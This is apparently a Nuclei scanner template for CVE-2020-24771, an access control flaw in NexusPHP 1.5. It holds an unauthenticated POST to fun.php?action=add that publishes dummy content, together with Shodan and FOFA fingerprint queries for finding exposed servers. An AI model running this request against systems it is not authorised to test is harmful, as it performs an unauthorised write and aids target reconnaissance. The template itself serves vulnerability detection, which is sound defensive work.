id: CVE-2020-24771

info:
  name: Incorrect access control in NexusPHP 1.5.beta5.20120707
  author: ProjectDiscoveryAI
  severity: high
  description: Unauthorized attackers can access published content due to incorrect access control in NexusPHP 1.5.beta5.20120707.
  impact: |
    Successful exploitation could allow an attacker to gain unauthorized access to sensitive information.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version of NexusPHP.
  reference:
    - https://cwe.mitre.org/data/definitions/306.html
    - https://github.com/Live-Hack-CVE/CVE-2020-24771
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-24771
    cwe-id: CWE-863
    epss-score: 0.00169
    epss-percentile: 0.54968
    cpe: cpe:2.3:a:nexusphp:nexusphp:1.5:*:*:*:*:*:*:*
  metadata:
    vendor: nexusphp
    product: nexusphp
    shodan-query: http.favicon.hash:-582931176
    fofa-query: icon_hash=-582931176

http:
  - method: POST
    path:
      - "{{BaseURL}}/fun.php?action=add"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded
      Upgrade-Insecure-Requests: "1"

    body: |
      subject=123123213213213&color=1&font=0&size=0&body=123123512323333
    matchers:
      - type: word
        words:
          - "Content published successfully"
        part: body
